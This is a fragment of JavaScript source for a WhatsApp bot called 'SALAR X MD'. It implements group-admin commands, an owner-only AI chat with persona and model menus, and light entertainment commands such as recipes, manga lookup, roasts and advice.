                const mime = (quoted.msg || quoted).mimetype || '';

                if (!/image/.test(mime)) return reply("🖼️ *Reply to an image*");

                try {
                    const media = await quoted.download();
                    await devtrust.updateProfilePicture(m.chat, media);
                    reply('✅ *Group picture updated*');
                } catch (e) {
                    reply(`❌ *Failed:* ${e.message}`);
                }
            }
                break;

            case 'join': {
                if (!isCreator && !isSudo) return reply("🔒 *Owner/Sudo only*");

                if (!text) return reply(`🔗 *Usage:* ${prefix}join https://chat.whatsapp.com/xxxxxx`);

                const inviteCode = text.match(/chat\.whatsapp\.com\/([a-zA-Z0-9_-]+)/);
                if (!inviteCode) return reply("❌ *Invalid group link*");

                try {
                    await reply("🔄 *Joining group...*");
                    const result = await devtrust.groupAcceptInvite(inviteCode[1]);
                    reply(`✅ *Joined successfully!*\n🆔 ${result}`);
                } catch (e) {
                    reply(`❌ *Failed to join:* ${e.message}`);
                }
            }
                break;

            case 'announce':
            case 'announcement': {
                if (!m.isGroup) return reply("👥 *Groups only*");
                if (!isAdmins && !isCreator) return reply("🔒 *Admins only*");

                if (!text) return reply(`📢 *Usage:* ${prefix}announce Your message here`);

                const groupMetadata = await devtrust.groupMetadata(m.chat).catch(() => null);
                const participants = groupMetadata?.participants || [];

                await devtrust.sendMessage(m.chat, addNewsletterContext({
                    image: { url: 'https://i.ibb.co/rGr4bWW8/image1.jpg' },
                    caption: `📢 *GROUP ANNOUNCEMENT*\n\n${text}\n\n- @${m?.sender?.split('@')?.[0] || 'User'}`,
                    mentions: participants.map(p => p.id)
                }));
            }
                break;

            case 'acceptall': {
                if (!m.isGroup) return reply("👥 *Groups only*");
                if (!isAdmins && !isCreator) return reply("🔒 *Admins only*");

                try {
                    const requests = await devtrust.groupRequestParticipantsList(m.chat);
                    if (!requests || requests.length === 0) {
                        return reply("📭 *No pending join requests*");
                    }

                    reply(`🔄 *Accepting ${requests.length} requests...*`);

                    let accepted = 0;
                    for (let req of requests) {
                        if (req.requestMethod === 'invite') {
                            await devtrust.groupRequestParticipantsUpdate(m.chat, [req.jid], 'accept');
                            accepted++;
                            await sleep(1000);
                        }
                    }

                    reply(`✅ *Accepted ${accepted} join requests*`);
                } catch (e) {
                    reply(`❌ *Error:* ${e.message}`);
                }
            }
                break;

            case 'rejectall': {
                if (!m.isGroup) return reply("👥 *Groups only*");
                if (!isAdmins && !isCreator) return reply("🔒 *Admins only*");

                try {
                    const requests = await devtrust.groupRequestParticipantsList(m.chat);
                    if (!requests || requests.length === 0) {
                        return reply("📭 *No pending join requests*");
                    }

                    reply(`🔄 *Rejecting ${requests.length} requests...*`);

                    let rejected = 0;
                    for (let req of requests) {
                        await devtrust.groupRequestParticipantsUpdate(m.chat, [req.jid], 'reject');
                        rejected++;
                        await sleep(1000);
                    }

                    reply(`❌ *Rejected ${rejected} join requests*`);
                } catch (e) {
                    reply(`❌ *Error:* ${e.message}`);
                }
            }
                break;
                
//AI ACTIVE
case 'raju':
case 'raju-active': {
if (!isCreator) return reply('🔒 *Owner only*');
    const uid = m.sender;
    const session = rajuGetSession(uid);

    // Helper kirim interactive message
    async function rajuSend(chatId, bodyText, buttons, footerText = '© 𝗦𝗔𝗟𝗔𝗥 𝗫 𝗠𝗗') {
        try {
            const msg = generateWAMessageFromContent(chatId, {
                viewOnceMessage: {
                    message: {
                        interactiveMessage: proto.Message.InteractiveMessage.create({
                            body: proto.Message.InteractiveMessage.Body.create({ text: bodyText }),
                            footer: proto.Message.InteractiveMessage.Footer.create({ text: footerText }),
                            nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                                buttons: buttons.map(b =>
                                    proto.Message.InteractiveMessage.NativeFlowMessage.NativeFlowButton.create({
                                        name: b.name,
                                        buttonParamsJson: JSON.stringify(b.params)
                                    })
                                )
                            }),
                            contextInfo: proto.ContextInfo.create({
                                forwardingScore: 999,
                                isForwarded: true,
                                forwardedNewsletterMessageInfo: proto.Message.InteractiveMessage.create({
                                    newsletterJid: '120363427254972269@newsletter',
                                    newsletterName: '© 𝗦𝗔𝗟𝗔𝗥 𝗫 𝗠𝗗 by 𝗦𝗔𝗟𝗔𝗥 𝗫 𝗠𝗗',
                                    serverMessageId: -1
                                })
                            })
                        })
                    }
                }
            }, { quoted: m, userJid: devtrust.user.jid });
            await devtrust.relayMessage(chatId, msg.message, { messageId: msg.key.id });
        } catch (e) {
            // Fallback ke text biasa jika interactive gagal
            await devtrust.sendMessage(chatId, addNewsletterContext({ text: bodyText }), { quoted: m });
        }
    }

    // Helper kirim single_select list
    async function rajuSendList(chatId, bodyText, listTitle, rows, footerText = '© 𝗦𝗔𝗟𝗔𝗥 𝗫 𝗠𝗗') {
        try {
            const msg = generateWAMessageFromContent(chatId, {
                viewOnceMessage: {
                    message: {
                        interactiveMessage: proto.Message.InteractiveMessage.create({
                            body: proto.Message.InteractiveMessage.Body.create({ text: bodyText }),
                            footer: proto.Message.InteractiveMessage.Footer.create({ text: footerText }),
                            nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                                buttons: [
                                    proto.Message.InteractiveMessage.NativeFlowMessage.NativeFlowButton.create({
                                        name: 'single_select',
                                        buttonParamsJson: JSON.stringify({
                                            title: listTitle,
                                            sections: [{ title: listTitle, rows: rows }]
                                        })
                                    })
                                ]
                            }),
                            contextInfo: proto.ContextInfo.create({
                                forwardingScore: 999,
                                isForwarded: true,
                                forwardedNewsletterMessageInfo: proto.Message.InteractiveMessage.create({
                                    newsletterJid: '120363427254972269@newsletter',
                                    newsletterName: '© 𝗦𝗔𝗟𝗔𝗥 𝗫 𝗠𝗗 by 𝗦𝗔𝗟𝗔𝗥 𝗫 𝗠𝗗',
                                    serverMessageId: -1
                                })
                            })
                        })
                    }
                }
            }, { quoted: m, userJid: devtrust.user.jid });
            await devtrust.relayMessage(chatId, msg.message, { messageId: msg.key.id });
        } catch (e) {
            await devtrust.sendMessage(chatId, addNewsletterContext({ text: bodyText }), { quoted: m });
        }
    }

    // 1. IF THE USER ALREADY HAS AN ACTIVE SESSION
    if (session && session.active) {
        const purposeCfg = RAJU_PURPOSE_MODELS[session.purpose] || {};
        const statusTxt =
            `📊 *RAJU AI ACTIVE WORKSPACE*\n\n` +
            `👤 *User* : ${m.pushName || 'User'}\n` +
            `🎯 *Mode* : ${purposeCfg.label || '-'}\n` +
            `🤖 *Model* : \`${session.model}\`\n` +
            `🎭 *Persona* : ${session.karakterLabel || 'Factory Default'}\n` +
            `🌐 *Web Search* : ${session.webSearch ? '✅ Active' : '❌ Disabled'}\n\n` +
            `💬 Ready to receive prompts. Use buttons below to configure:`;

        await rajuSend(m.chat, statusTxt, [
            { name: 'quick_reply', params: { display_text: '🔄 Change Mode', id: '.raju-action-move' } },
            { name: 'quick_reply', params: { display_text: '🎭 Change Persona', id: '.raju-action-char' } },
            { name: 'quick_reply', params: { display_text: '🤖 Change AI Model', id: '.raju-action-model' } },
            { name: 'quick_reply', params: { display_text: '🛑 Shutdown Engine', id: '.raju-off' } }
        ]);
        return;
    }

    // 2. IF THE USER DOESN'T HAVE A SESSION YET
    RAJU_PENDING[uid] = { stage: 'await_purpose', chatId: m.chat };

    const menuTxt =
        `🌟 *WELCOME TO SALAR AI PLATFORM* 🌟\n\n` +
        `Hello *${m.pushName || 'User'}*!\n` +
        `Choose your primary workspace objective:`;

    const purposeRows = Object.keys(RAJU_PURPOSE_MODELS).map(k => ({
        title: RAJU_PURPOSE_MODELS[k].label,
        description: RAJU_PURPOSE_MODELS[k].desc || '',
        id: `.raju-internal-setpurpose ${k}`
    }));

    await rajuSendList(m.chat, menuTxt, '🎯 Select Objective Mode', purposeRows);
}
break;

case 'raju-off': {
if (!isCreator) return reply('🔒 *Owner only*');
    const uid = m.sender;
    if (!rajuGetSession(uid)) return reply(`⚠️ *No active session found.*`);
    rajuDelSession(uid);
    delete RAJU_PENDING[uid];

    try {
        const msg = generateWAMessageFromContent(m.chat, {
            viewOnceMessage: {
                message: {
                    interactiveMessage: proto.Message.InteractiveMessage.create({
                        body: proto.Message.InteractiveMessage.Body.create({
                            text: `🛑 *RAJU Engine offline.*\nSession cleared. Goodbye! 👋`
                        }),
                        footer: proto.Message.InteractiveMessage.Footer.create({ text: '© 𝗦𝗔𝗟𝗔𝗥 𝗫 𝗠𝗗' }),
                        nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                            buttons: [
                                proto.Message.InteractiveMessage.NativeFlowMessage.NativeFlowButton.create({
                                    name: 'quick_reply',
                                    buttonParamsJson: JSON.stringify({ display_text: '🚀 Boot Engine', id: '.raju' })
                                })
                            ]
                        }),
                        contextInfo: proto.ContextInfo.create({
                            forwardingScore: 999,
                            isForwarded: true,
                            forwardedNewsletterMessageInfo: proto.Message.InteractiveMessage.create({
                                newsletterJid: '120363427254972269@newsletter',
                                newsletterName: '© 𝗦𝗔𝗟𝗔𝗥 𝗫 𝗠𝗗 by 𝗦𝗔𝗟𝗔𝗥 𝗫 𝗠𝗗',
                                serverMessageId: -1
                            })
                        })
                    })
                }
            }
        }, { quoted: m, userJid: devtrust.user.jid });
        await devtrust.relayMessage(m.chat, msg.message, { messageId: msg.key.id });
    } catch (e) {
        await devtrust.sendMessage(m.chat, addNewsletterContext({
            text: `🛑 *RAJU Engine offline.* Session cleared. Type *.raju* to restart.`
        }), { quoted: m });
    }
}
break;

case 'clearallsesi': {
if (!isCreator) return reply('🔒 *Owner only*');
    const uid = m.sender;
    if (uid !== RAJU_OWNER_JID) return reply(`🚫 *ACCESS DENIED*`);
    try {
        const activeUids = Object.keys(RAJU_SESSIONS).filter(id => RAJU_SESSIONS[id]?.active === true);
        if (activeUids.length === 0) return reply(`📭 *Zero active pipelines found.*`);
        for (const id of activeUids) {
            RAJU_SESSIONS[id].active = false;
            delete RAJU_PENDING[id];
        }
        rajuSaveSessions();
        reply(`🛑 *GLOBAL REBOOT COMPLETED.* All running instances forced offline.`);
    } catch (e) { reply(`❌ Error: ${e.message}`); }
}
break;

// ====================[ RAJU INTERNAL HANDLERS ]====================

case 'raju-action-move': {
if (!isCreator) return reply('🔒 *Owner only*');
    const uid = m.sender;
    if (!rajuGetSession(uid)?.active) return reply(`⚠️ *Session active status required.*`);
    RAJU_PENDING[uid] = { stage: 'await_purpose_move', chatId: m.chat };

    const moveRows = Object.keys(RAJU_PURPOSE_MODELS).map(k => ({
        title: RAJU_PURPOSE_MODELS[k].label,
        description: RAJU_PURPOSE_MODELS[k].desc || '',
        id: `.raju-internal-setpurpose ${k}`
    }));

    try {
        const msg = generateWAMessageFromContent(m.chat, {
            viewOnceMessage: {
                message: {
                    interactiveMessage: proto.Message.InteractiveMessage.create({
                        body: proto.Message.InteractiveMessage.Body.create({
                            text: `🔄 *SWITCHING OPERATIONAL PARAMETERS*\n\nSelect your new target focus:`
                        }),
                        footer: proto.Message.InteractiveMessage.Footer.create({ text: '© 𝗦𝗔𝗟𝗔𝗥 𝗫 𝗠𝗗' }),
                        nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                            buttons: [
                                proto.Message.InteractiveMessage.NativeFlowMessage.NativeFlowButton.create({
                                    name: 'single_select',
                                    buttonParamsJson: JSON.stringify({
                                        title: '🔄 Select New Focus',
                                        sections: [{ title: 'Available Modes', rows: moveRows }]
                                    })
                                })
                            ]
                        }),
                        contextInfo: proto.ContextInfo.create({
                            forwardingScore: 999,
                            isForwarded: true,
                            forwardedNewsletterMessageInfo: proto.Message.InteractiveMessage.create({
                                newsletterJid: '120363427254972269@newsletter',
                                newsletterName: '© 𝗦𝗔𝗟𝗔𝗥 𝗫 𝗠𝗗 by 𝗦𝗔𝗟𝗔𝗥 𝗫 𝗠𝗗',
                                serverMessageId: -1
                            })
                        })
                    })
                }
            }
        }, { quoted: m, userJid: devtrust.user.jid });
        await devtrust.relayMessage(m.chat, msg.message, { messageId: msg.key.id });
    } catch (e) {
        await devtrust.sendMessage(m.chat, addNewsletterContext({ text: `🔄 *Change Mode*\n\nReply: .raju-internal-setpurpose [mode]` }), { quoted: m });
    }
}
break;

case 'raju-internal-setpurpose': {
if (!isCreator) return reply('🔒 *Owner only*');
    const uid = m.sender;
    const targetKey = q.trim().toLowerCase();
    const cfg = RAJU_PURPOSE_MODELS[targetKey];
    if (!cfg) return;

    const existing = rajuGetSession(uid) || {};
rajuSetSession(uid, {
    active: true,
    chatId: m.chat,
    purpose: targetKey,
    model: cfg.model,
    convId: existing.convId || rajuNewConvId(),
    webSearch: targetKey === 'websearch' ? true : (existing.webSearch || false),
    systemPrompt: existing.systemPrompt || null,
    karakterLabel: existing.karakterLabel || null,
    startedAt: existing.startedAt || new Date().toISOString(),
    username: m.pushName || 'WhatsApp User'
});
    delete RAJU_PENDING[uid];

    const okTxt =
        `✅ *RAJU CORE CONFIGURED!*\n\n` +
        `🎯 *Mode:* ${cfg.label}\n` +
        `🤖 *Engine:* \`${cfg.model}\`\n\n` +
        `System is fully operational. Start chatting or configure below:`;

    try {
        const msg = generateWAMessageFromContent(m.chat, {
            viewOnceMessage: {
                message: {
                    interactiveMessage: proto.Message.InteractiveMessage.create({
                        body: proto.Message.InteractiveMessage.Body.create({ text: okTxt }),
                        footer: proto.Message.InteractiveMessage.Footer.create({ text: '© 𝗦𝗔𝗟𝗔𝗥 𝗫 𝗠𝗗' }),
                        nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                            buttons: [
                                proto.Message.InteractiveMessage.NativeFlowMessage.NativeFlowButton.create({
                                    name: 'quick_reply',
                                    buttonParamsJson: JSON.stringify({ display_text: '🎭 Set Persona', id: '.raju-action-char' })
                                }),
                                proto.Message.InteractiveMessage.NativeFlowMessage.NativeFlowButton.create({
                                    name: 'quick_reply',
                                    buttonParamsJson: JSON.stringify({ display_text: '🤖 Change AI Model', id: '.raju-action-model' })
                                }),
                                proto.Message.InteractiveMessage.NativeFlowMessage.NativeFlowButton.create({
                                    name: 'quick_reply',
                                    buttonParamsJson: JSON.stringify({ display_text: '📊 Control Room', id: '.raju' })
                                })
                            ]
                        }),
                        contextInfo: proto.ContextInfo.create({
                            forwardingScore: 999,
                            isForwarded: true,
                            forwardedNewsletterMessageInfo: proto.Message.InteractiveMessage.create({
                                newsletterJid: '120363427254972269@newsletter',
                                newsletterName: '© 𝗦𝗔𝗟𝗔𝗥 𝗫 𝗠𝗗 by 𝗦𝗔𝗟𝗔𝗥 𝗫 𝗠𝗗',
                                serverMessageId: -1
                            })
                        })
                    })
                }
            }
        }, { quoted: m, userJid: devtrust.user.jid });
        await devtrust.relayMessage(m.chat, msg.message, { messageId: msg.key.id });
    } catch (e) {
        await devtrust.sendMessage(m.chat, addNewsletterContext({ text: okTxt }), { quoted: m });
    }
}
break;

case 'raju-action-char': {
if (!isCreator) return reply('🔒 *Owner only*');
    const uid = m.sender;
    if (!rajuGetSession(uid)?.active) return reply(`⚠️ *Session active status required.*`);

    const charRows = Object.keys(RAJU_KARAKTER_PRESETS).map(k => {
        const preset = RAJU_KARAKTER_PRESETS[k];
        const shortDesc = preset.prompt.split('\n')[0].replace('You are Raju — ', '').slice(0, 72);
        return {
            title: preset.label,
            description: shortDesc + '...',
            id: `.raju-internal-savechar ${k}`
        };
    });
    charRows.push({
        title: '✏️ Custom Persona',
        description: 'Inject your own custom behavioral ruleset',
        id: '.raju-internal-savechar custom'
    });

    try {
        const msg = generateWAMessageFromContent(m.chat, {
            viewOnceMessage: {
                message: {
                    interactiveMessage: proto.Message.InteractiveMessage.create({
                        body: proto.Message.InteractiveMessage.Body.create({
                            text: `🎭 *RAJU PERSONALITY SELECTOR*\n\nChoose a persona from the list below:`
                        }),
                        footer: proto.Message.InteractiveMessage.Footer.create({ text: '© 𝗦𝗔𝗟𝗔𝗥 𝗫 𝗠𝗗' }),
                        nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                            buttons: [
                                proto.Message.InteractiveMessage.NativeFlowMessage.NativeFlowButton.create({
                                    name: 'single_select',
                                    buttonParamsJson: JSON.stringify({
                                        title: '🎭 Select Persona',
                                        sections: [{ title: 'Available Personas', rows: charRows }]
                                    })
                                })
                            ]
                        }),
                        contextInfo: proto.ContextInfo.create({
                            forwardingScore: 999,
                            isForwarded: true,
                            forwardedNewsletterMessageInfo: proto.Message.InteractiveMessage.create({
                                newsletterJid: '120363427254972269@newsletter',
                                newsletterName: '© 𝗦𝗔𝗟𝗔𝗥 𝗫 𝗠𝗗 by 𝗦𝗔𝗟𝗔𝗥 𝗫 𝗠𝗗',
                                serverMessageId: -1
                            })
                        })
                    })
                }
            }
        }, { quoted: m, userJid: devtrust.user.jid });
        await devtrust.relayMessage(m.chat, msg.message, { messageId: msg.key.id });
    } catch (e) {
        await devtrust.sendMessage(m.chat, addNewsletterContext({ text: `🎭 *Choose Persona*\n\nReply: .raju-internal-savechar [key]` }), { quoted: m });
    }
}
break;

case 'raju-internal-savechar': {
if (!isCreator) return reply('🔒 *Owner only*');
    const uid = m.sender;
    const key = q.trim().toLowerCase();
    const s = rajuGetSession(uid);
    if (!s || !s.active) return;

    const preset = RAJU_KARAKTER_PRESETS[key];
    if (!preset) return;

    rajuSetSession(uid, { systemPrompt: preset.prompt, karakterLabel: preset.label, convId: rajuNewConvId() });
    try { rajuCallAI(preset.prompt, s.model, RAJU_SESSIONS[uid].convId, false, preset.prompt); } catch (e) {}

    try {
        const msg = generateWAMessageFromContent(m.chat, {
            viewOnceMessage: {
                message: {
                    interactiveMessage: proto.Message.InteractiveMessage.create({
                        body: proto.Message.InteractiveMessage.Body.create({
                            text: `✅ *BEHAVIORAL SYNC COMPLETED*\n\nRAJU AI is now operating as: *${preset.label}*`
                        }),
                        footer: proto.Message.InteractiveMessage.Footer.create({ text: '© 𝗦𝗔𝗟𝗔𝗥 𝗫 𝗠𝗗' }),
                        nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                            buttons: [
                                proto.Message.InteractiveMessage.NativeFlowMessage.NativeFlowButton.create({
                                    name: 'quick_reply',
                                    buttonParamsJson: JSON.stringify({ display_text: '📊 Control Room', id: '.raju' })
                                })
                            ]
                        }),
                        contextInfo: proto.ContextInfo.create({
                            forwardingScore: 999,
                            isForwarded: true,
                            forwardedNewsletterMessageInfo: proto.Message.InteractiveMessage.create({
                                newsletterJid: '120363427254972269@newsletter',
                                newsletterName: '© 𝗦𝗔𝗟𝗔𝗥 𝗫 𝗠𝗗 by 𝗦𝗔𝗟𝗔𝗥 𝗫 𝗠𝗗',
                                serverMessageId: -1
                            })
                        })
                    })
                }
            }
        }, { quoted: m, userJid: devtrust.user.jid });
        await devtrust.relayMessage(m.chat, msg.message, { messageId: msg.key.id });
    } catch (e) {
        await devtrust.sendMessage(m.chat, addNewsletterContext({ text: `✅ Persona set: *${preset.label}*` }), { quoted: m });
    }
}
break;

case 'raju-action-model': {
if (!isCreator) return reply('🔒 *Owner only*');
    const uid = m.sender;
    if (!rajuGetSession(uid)?.active) return reply(`⚠️ *Session active status required.*`);

    const modelRows = RAJU_ALL_MODELS.map(mod => ({
        title: mod,
        description: `Switch AI engine to: ${mod}`,
        id: `.raju-internal-savemodel ${mod}`
    }));

    try {
        const msg = generateWAMessageFromContent(m.chat, {
            viewOnceMessage: {
                message: {
                    interactiveMessage: proto.Message.InteractiveMessage.create({
                        body: proto.Message.InteractiveMessage.Body.create({
                            text: `🤖 *AI MODEL SELECTION*\n\nChoose an engine from the list below:`
                        }),
                        footer: proto.Message.InteractiveMessage.Footer.create({ text: '© 𝗦𝗔𝗟𝗔𝗥 𝗫 𝗠𝗗' }),
                        nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                            buttons: [
                                proto.Message.InteractiveMessage.NativeFlowMessage.NativeFlowButton.create({
                                    name: 'single_select',
                                    buttonParamsJson: JSON.stringify({
                                        title: '🤖 Select AI Engine',
                                        sections: [{ title: 'Available Models', rows: modelRows }]
                                    })
                                })
                            ]
                        }),
                        contextInfo: proto.ContextInfo.create({
                            forwardingScore: 999,
                            isForwarded: true,
                            forwardedNewsletterMessageInfo: proto.Message.InteractiveMessage.create({
                                newsletterJid: '120363427254972269@newsletter',
                                newsletterName: '© 𝗦𝗔𝗟𝗔𝗥 𝗫 𝗠𝗗 by 𝗦𝗔𝗟𝗔𝗥 𝗫 𝗠𝗗',
                                serverMessageId: -1
                            })
                        })
                    })
                }
            }
        }, { quoted: m, userJid: devtrust.user.jid });
        await devtrust.relayMessage(m.chat, msg.message, { messageId: msg.key.id });
    } catch (e) {
        await devtrust.sendMessage(m.chat, addNewsletterContext({ text: `🤖 *Select Model*\n\nReply: .raju-internal-savemodel [model]` }), { quoted: m });
    }
}
break;

case 'raju-internal-savemodel': {
if (!isCreator) return reply('🔒 *Owner only*');
    const uid = m.sender;
    const selectedModel = q.trim();
    if (!RAJU_ALL_MODELS.includes(selectedModel)) return;

    const s = rajuGetSession(uid);
    if (!s || !s.active) return reply(`⚠️ *No active session found.*`);

    rajuSetSession(uid, { model: selectedModel });

    try {
        const msg = generateWAMessageFromContent(m.chat, {
            viewOnceMessage: {
                message: {
                    interactiveMessage: proto.Message.InteractiveMessage.create({
                        body: proto.Message.InteractiveMessage.Body.create({
                            text: `✅ *AI Engine Updated!*\n\n🤖 *Active Model:* \`${selectedModel}\``
                        }),
                        footer: proto.Message.InteractiveMessage.Footer.create({ text: '© 𝗦𝗔𝗟𝗔𝗥 𝗫 𝗠𝗗' }),
                        nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                            buttons: [
                                proto.Message.InteractiveMessage.NativeFlowMessage.NativeFlowButton.create({
                                    name: 'quick_reply',
                                    buttonParamsJson: JSON.stringify({ display_text: '📊 Control Room', id: '.raju' })
                                })
                            ]
                        }),
                        contextInfo: proto.ContextInfo.create({
                            forwardingScore: 999,
                            isForwarded: true,
                            forwardedNewsletterMessageInfo: proto.Message.InteractiveMessage.create({
                                newsletterJid: '120363427254972269@newsletter',
                                newsletterName: '© 𝗦𝗔𝗟𝗔𝗥 𝗫 𝗠𝗗 by 𝗦𝗔𝗟𝗔𝗥 𝗫 𝗠𝗗',
                                serverMessageId: -1
                            })
                        })
                    })
                }
            }
        }, { quoted: m, userJid: devtrust.user.jid });
        await devtrust.relayMessage(m.chat, msg.message, { messageId: msg.key.id });
    } catch (e) {
        await devtrust.sendMessage(m.chat, addNewsletterContext({ text: `✅ Model updated: \`${selectedModel}\`` }), { quoted: m });
    }
}
break;



// ===================================================================


            case 'poll':
            case 'createpoll': {
                if (!m.isGroup) return reply("👥 *Groups only*");
                if (!isAdmins && !isCreator) return reply("🔒 *Admins only*");

                if (!text || !text.includes('|')) {
                    return reply(`📊 *Create a poll*\n\n` +
                        `📝 *Usage:* ${prefix}poll Question | Option1 | Option2\n` +
                        `💡 *Example:* ${prefix}poll Best color? | Red | Blue | Green`);
                }

                const parts = text.split('|');
                const question = parts[0].trim();
                const options = parts.slice(1).map(opt => opt.trim());

                if (options.length < 2) return reply("❌ *At least 2 options required*");
                if (options.length > 5) return reply("❌ *Maximum 5 options allowed*");

                await devtrust.sendMessage(m.chat, {
                    poll: {
                        name: question,
                        values: options,
                        selectableCount: 1
                    }
                });
            }
                break;



            case "mathfact": {
                await devtrust.sendPresenceUpdate("composing", m.chat);
                try {
                    const res = await axios.get("http://numbersapi.com/random/math?json");

                    const caption = `🧮 *𝗦𝗔𝗟𝗔𝗥 𝗫 𝗠𝗗 Math Fact*
        
${res.data.text}

💡 *Random number knowledge, just for you*`;

                    await devtrust.sendMessage(m.chat,
                        addNewsletterContext({
                            text: caption,
                            mentions: [m.sender]
                        }),
                        { quoted: m }
                    );
                } catch {
                    reply("❌ *Math fact unavailable* • Numbers are being shy today");
                }
            }
                break;

            case "recipe-ingredient": {
                if (!text) return reply("🍳 *Example:* recipe-ingredient chicken");

                await devtrust.sendPresenceUpdate("composing", m.chat);

                try {
                    const res = await axios.get(`https://www.themealdb.com/api/json/v1/1/filter.php?i=${encodeURIComponent(text)}`);
                    if (!res.data.meals) return reply(`🍽️ *No recipes found* using "${text}"`);

                    const meals = res.data.meals
                        .slice(0, 5)
                        .map((m, i) => `${i + 1}. *${m.strMeal}*`)
                        .join("\n");

                    const caption = `🍳 *𝗦𝗔𝗟𝗔𝗥 𝗫 𝗠𝗗 Recipes*
        
🔍 *Ingredient:* ${text}

${meals}

🔗 *View full recipes:* https://www.themealdb.com`;

                    await devtrust.sendMessage(m.chat,
                        addNewsletterContext({
                            text: caption,
                            mentions: [m.sender]
                        }),
                        { quoted: m }
                    );
                } catch {
                    reply("❌ *Recipe fetch failed* • Kitchen's closed, try again later");
                }
            }
                break;

            case 'manga': {
                if (!text) return reply(`📖 *Usage:* ${command} <manga name>`);

                try {
                    let res = await axios.get(`https://api.jikan.moe/v4/manga?q=${encodeURIComponent(text)}&limit=1`);
                    let data = res.data.data[0];

                    if (!data) return reply("🔍 *Manga not found* • Try a different title");

                    let mangaInfo = `📚 *𝗦𝗔𝗟𝗔𝗥 𝗫 𝗠𝗗 Manga*
        
📌 *${data.title}*
━━━━━━━━━━━━
📊 Score: ${data.score || "N/A"} ⭐
📚 Volumes: ${data.volumes || "N/A"}
📑 Chapters: ${data.chapters || "N/A"}
📖 Status: ${data.status || "N/A"}

📝 ${data.synopsis ? data.synopsis.substring(0, 300) + "..." : "No synopsis available"}

🔗 ${data.url}`;

                    await devtrust.sendMessage(m.chat,
                        addNewsletterContext({
                            image: { url: data.images.jpg.large_image_url },
                            caption: mangaInfo
                        }),
                        { quoted: m }
                    );
                } catch (e) {
                    console.error(e);
                    reply("❌ *Manga fetch failed* • The manga gods are angry today");
                }
            }
                break;

            case 'flirt': {
                const lines = [
                    "Are you a magician? Because whenever I look at you, everyone else disappears.",
                    "Do you have a map? I keep getting lost in your eyes.",
                    "Is your name Google? Because you have everything I've been searching for.",
                    "Are you made of copper and tellurium? Because you're Cu-Te.",
                    "If you were a vegetable, you'd be a cute-cumber.",
                    "Do you believe in love at first sight, or should I walk past again?",
                    "Is your dad a baker? Because you're a cutie pie.",
                    "You must be tired because you've been running through my mind all day.",
                    "Are you a parking ticket? Because you've got FINE written all over you.",
                    "Did it hurt when you fell from heaven?"
                ];
                reply(`💘 *Flirt:* ${lines[Math.floor(Math.random() * lines.length)]}`);
            }
                break;

            case 'paptt': {
                if (!isCreator) return reply("🔒 *Creator only command*");

                global.paptt = [
                    "https://telegra.ph/file/5c62d66881100db561c9f.mp4",
                    "https://telegra.ph/file/a5730f376956d82f9689c.jpg",
                    "https://telegra.ph/file/8fb304f891b9827fa88a5.jpg",
                    "https://telegra.ph/file/0c8d173a9cb44fe54f3d3.mp4",
                    "https://telegra.ph/file/b58a5b8177521565c503b.mp4"
                ];

                let url = global.paptt[Math.floor(Math.random() * global.paptt.length)];

                if (url.includes('.')) {
                    await devtrust.sendMessage(m.chat,
                        addNewsletterContext({
                            video: { url: url },
                            caption: "🎬 *𝗦𝗔𝗟𝗔𝗥 𝗫 𝗠𝗗 Media*"
                        }),
                        { quoted: m }
                    );
                } else {
                    await devtrust.sendMessage(m.chat,
                        addNewsletterContext({
                            image: { url: url },
                            caption: "📸 *𝗦𝗔𝗟𝗔𝗥 𝗫 𝗠𝗗 Media*"
                        }),
                        { quoted: m }
                    );
                }
            }
                break;

            case "ascii": {
                if (!text) return reply("✏️ *Example:* ascii Hello World");

                try {
                    const res = await axios.get(`https://artii.herokuapp.com/make?text=${encodeURIComponent(text)}`);
                    const ascii = res.data || text;

                    await devtrust.sendMessage(m.chat,
                        addNewsletterContext({
                            text: `🎨 *𝗦𝗔𝗟𝗔𝗥 𝗫 𝗠𝗗 ASCII*\n\n\`\`\`${ascii}\`\`\``
                        }),
                        { quoted: m }
                    );
                } catch (e) {
                    console.error("ASCII ERROR:", e);
                    reply("❌ *ASCII generation failed*");
                }
            }
                break;

            case 'roast': {
                let target = m.mentionedJid?.[0] ? '@' + m.mentionedJid[0].split('@')[0] : text || '@' + m?.sender?.split('@')?.[0] || 'User';

                try {
                    async function openaiRoast(victim) {
                        let response = await axios.post("https://chateverywhere.app/api/chat/", {
                            "model": { "id": "gpt-4", "name": "GPT-4", "maxLength": 32000 },
                            "messages": [{
                                "pluginId": null,
                                "content": `Roast this person in a funny but savage way (1-2 lines): ${victim}`,
                                "role": "user"
                            }],
                            "temperature": 0.8
                        });
                        return response.data;
                    }

                    let roast = await openaiRoast(target);
                    reply(`🔥 *Roast for ${target}:*\n\n${roast}`);
                } catch (e) {
                    console.error(e);
                    reply("⚠️ *Roast failed* • The burn machine needs repairs");
                }
            }
                break;

            case 'compliment': {
                let target = m.mentionedJid?.[0] ? '@' + m.mentionedJid[0].split('@')[0] : text || '@' + m?.sender?.split('@')?.[0] || 'User';

                try {
                    async function openaiCompliment(victim) {
                        let response = await axios.post("https://chateverywhere.app/api/chat/", {
                            "model": { "id": "gpt-4", "name": "GPT-4", "maxLength": 32000 },
                            "messages": [{
                                "pluginId": null,
                                "content": `Give a sweet, kind compliment to this person (1-2 lines max): ${victim}`,
                                "role": "user"
                            }],
                            "temperature": 0.7
                        });
                        return response.data;
                    }

                    let compliment = await openaiCompliment(target);
                    reply(`💫 *Compliment for ${target}:*\n\n${compliment}`);
                } catch (e) {
                    console.error(e);
                    reply("⚠️ *Compliment failed* • The kindness machine is broken");
                }
            }

                break;
            case "advice": {
                try {
                    const res = await axios.get("https://api.adviceslip.com/advice");
                    const advice = res.data?.slip?.advice || "Keep going!";
                    reply(`💭 *𝗦𝗔𝗟𝗔𝗥 𝗫 𝗠𝗗 Advice*\n\n"${advice}"`);
                } catch (e) {
                    console.error("ADVICE ERROR:", e);
                    reply("❌ *Advice machine is sleeping* • Try again later");
                }
            }
                break;

